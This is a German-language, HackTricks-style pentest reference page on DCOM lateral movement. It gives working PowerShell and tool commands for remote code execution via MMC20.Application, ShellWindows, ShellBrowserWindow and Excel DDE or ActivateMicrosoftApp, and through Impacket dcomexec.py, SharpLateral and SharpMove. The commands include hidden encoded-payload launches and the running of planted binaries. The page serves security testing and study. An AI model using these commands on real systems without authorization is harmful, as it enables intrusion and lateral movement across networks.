# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement ist attraktiv, weil vorhandene, über RPC/DCOM bereitgestellte COM-Server wiederverwendet werden, anstatt einen Service oder eine geplante Aufgabe zu erstellen. In der Praxis bedeutet dies, dass die anfängliche Verbindung normalerweise über TCP/135 beginnt und anschließend zu dynamisch zugewiesenen hohen RPC-Ports wechselt.

## Voraussetzungen & Fallstricke

- Auf dem Zielsystem benötigen Sie normalerweise einen lokalen Administrator-Kontext, und der Remote-COM-Server muss den Remote-Start/die Remote-Aktivierung erlauben.
- Seit dem **14. März 2023** erzwingt Microsoft die DCOM-Härtung für unterstützte Systeme. Alte Clients, die eine niedrige Aktivierungs-Authentifizierungsebene anfordern, können fehlschlagen, sofern sie nicht mindestens `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` aushandeln. Moderne Windows-Clients werden normalerweise automatisch auf eine höhere Stufe gesetzt, daher funktionieren aktuelle Tools in der Regel weiterhin.<sup>[[3]](#references)</sup>
- Manuelle oder skriptbasierte DCOM-Ausführung benötigt im Allgemeinen TCP/135 sowie den dynamischen RPC-Portbereich des Ziels. Wenn Sie Impackets `dcomexec.py` verwenden und die Befehlsausgabe zurückerhalten möchten, benötigen Sie normalerweise außerdem SMB-Zugriff auf `ADMIN$` (oder eine andere beschreibbare/lesbare Freigabe).
- Wenn RPC/DCOM funktioniert, SMB jedoch blockiert ist, kann `dcomexec.py -nooutput` weiterhin für eine blinde Ausführung nützlich sein.

Schnellprüfungen:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Weitere Informationen zu dieser Technik finden Sie im Originalbeitrag unter [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM)-Objekte bieten interessante Möglichkeiten für netzwerkbasierte Interaktionen mit Objekten. Microsoft stellt sowohl für DCOM als auch für das Component Object Model (COM) umfassende Dokumentation bereit, die [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) verfügbar ist. Eine Liste der DCOM-Anwendungen kann mit dem folgenden PowerShell-Befehl abgerufen werden:
```bash
Get-CimInstance Win32_DCOMApplication
```
Das COM-Objekt [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) ermöglicht das Skripten von MMC-Snap-In-Operationen. Bemerkenswert ist, dass dieses Objekt unter `Document.ActiveView` eine `ExecuteShellCommand`-Methode enthält. Weitere Informationen zu dieser Methode finden Sie [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Überprüfen Sie dies durch Ausführen von:

Diese Funktion ermöglicht die Ausführung von Befehlen über ein Netzwerk mittels einer DCOM-Anwendung. Um als Administrator remote mit DCOM zu interagieren, kann PowerShell wie folgt verwendet werden:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Dieser Befehl stellt eine Verbindung zur DCOM-Anwendung her und gibt eine Instanz des COM-Objekts zurück. Anschließend kann die Methode ExecuteShellCommand aufgerufen werden, um einen Prozess auf dem Remotehost auszuführen. Der Prozess umfasst die folgenden Schritte:

Methoden prüfen:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE erlangen:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Das letzte Argument ist der Fensterstil. `7` hält das Fenster minimiert. Aus operativer Sicht führt die Ausführung auf Basis von MMC häufig dazu, dass ein entfernter `mmc.exe`-Prozess Ihre Payload startet, was sich von den unten beschriebenen Explorer-basierten Objekten unterscheidet.

## ShellWindows & ShellBrowserWindow

**Weitere Informationen zu dieser Technik finden Sie im ursprünglichen Beitrag [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Das **MMC20.Application**-Objekt wurde als Objekt identifiziert, dem explizite "LaunchPermissions" fehlen und das standardmäßig Berechtigungen verwendet, die Administratoren Zugriff gewähren. Weitere Details finden Sie in [diesem Thread](https://twitter.com/tiraniddo/status/817532039771525120). Außerdem wird empfohlen, OleView .NET von [@tiraniddo](https://twitter.com/tiraniddo) zu verwenden, um Objekte ohne explizite Launch Permission zu filtern.

Zwei spezifische Objekte, `ShellBrowserWindow` und `ShellWindows`, wurden aufgrund ihrer fehlenden expliziten Launch Permissions hervorgehoben. Das Fehlen eines `LaunchPermission`-Registry-Eintrags unter `HKCR:\AppID\{guid}` bedeutet, dass keine expliziten Berechtigungen vorhanden sind.

Im Vergleich zu `MMC20.Application` sind diese Objekte aus OPSEC-Sicht oft unauffälliger, da der Befehl auf dem Remote-Host häufig als Child von `explorer.exe` statt von `mmc.exe` endet.

### ShellWindows

Für `ShellWindows`, das keine ProgID besitzt, ermöglichen die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance` die Instanziierung des Objekts mithilfe seiner AppID. Dieser Prozess verwendet OleView .NET, um die CLSID von `ShellWindows` abzurufen. Nach der Instanziierung ist eine Interaktion über die `WindowsShell.Item`-Methode möglich, was zu einem Methodenaufruf wie `Document.Application.ShellExecute` führt.

Es wurden beispielhafte PowerShell-Befehle bereitgestellt, um das Objekt zu instanziieren und Befehle remote auszuführen:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` ist ähnlich, aber du kannst es direkt über seine CLSID instanziieren und zu `Document.Application.ShellExecute` pivotieren:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement mit Excel DCOM Objects

Lateral Movement kann durch das Ausnutzen von DCOM Excel Objects erreicht werden. Für detaillierte Informationen empfiehlt es sich, die Diskussion über die Nutzung von Excel DDE für Lateral Movement via DCOM im [Cybereason-Blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) zu lesen.<sup>[[5]](#references)</sup>

Das Empire-Projekt stellt ein PowerShell-Script bereit, das die Nutzung von Excel für Remote Code Execution (RCE) durch die Manipulation von DCOM Objects demonstriert. Nachfolgend finden sich Ausschnitte aus dem auf [Empires GitHub-Repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) verfügbaren Script, die verschiedene Methoden zeigen, Excel für RCE zu missbrauchen:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Neuere Forschung hat diesen Bereich mit der Methode `ActivateMicrosoftApp()` von `Excel.Application` erweitert. Die zentrale Idee besteht darin, dass Excel versuchen kann, ältere Microsoft-Anwendungen wie FoxPro, Schedule Plus oder Project zu starten, indem es den System-`PATH` durchsucht. Wenn ein Operator einen payload mit einem der erwarteten Namen an einem beschreibbaren Speicherort ablegen kann, der Bestandteil des `PATH` des Ziels ist, wird Excel ihn ausführen.<sup>[[4]](#references)</sup>

Anforderungen für diese Variante:

- Lokaler Administrator auf dem Ziel
- Excel auf dem Ziel installiert
- Möglichkeit, einen payload in ein beschreibbares Verzeichnis im `PATH` des Ziels zu schreiben

Praktisches Beispiel unter Ausnutzung der FoxPro-Suche (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Wenn auf dem angreifenden Host die lokale `Excel.Application`-ProgID nicht registriert ist, instanziieren Sie das Remote-Objekt stattdessen anhand der CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
In der Praxis missbrauchte Werte:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Automatisierungstools für Lateral Movement

Zwei Tools werden für die Automatisierung dieser Techniken hervorgehoben:

- **Invoke-DCOM.ps1**: Ein vom Empire-Projekt bereitgestelltes PowerShell-Skript, das die Ausführung verschiedener Methoden zum Ausführen von Code auf Remotecomputern vereinfacht. Dieses Skript ist im Empire-GitHub-Repository verfügbar.

- **SharpLateral**: Ein Tool zum Remote-Ausführen von Code, das mit folgendem Befehl verwendet werden kann:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatische Tools

- Das Powershell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) ermöglicht es, auf einfache Weise alle kommentierten Möglichkeiten zur Codeausführung auf anderen Maschinen aufzurufen.
- Mit Impacket's `dcomexec.py` können Befehle auf Remote-Systemen mithilfe von DCOM ausgeführt werden. Aktuelle Builds unterstützen `ShellWindows`, `ShellBrowserWindow` und `MMC20` und verwenden standardmäßig `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Du könntest auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Du könntest auch [**SharpMove**](https://github.com/0xthirteen/SharpMove) verwenden
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Referenzen

- [1] [Lateral Movement mit dem MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Runde 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 – Änderungen für den Windows DCOM Server Security Feature Bypass (CVE-2021-26414) verwalten](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Die Leistungsfähigkeit der DCOM Excel Application missbrauchen](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Excel DDE für Lateral Movement via DCOM nutzen](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

{{#include ../../banners/hacktricks-training.md}}
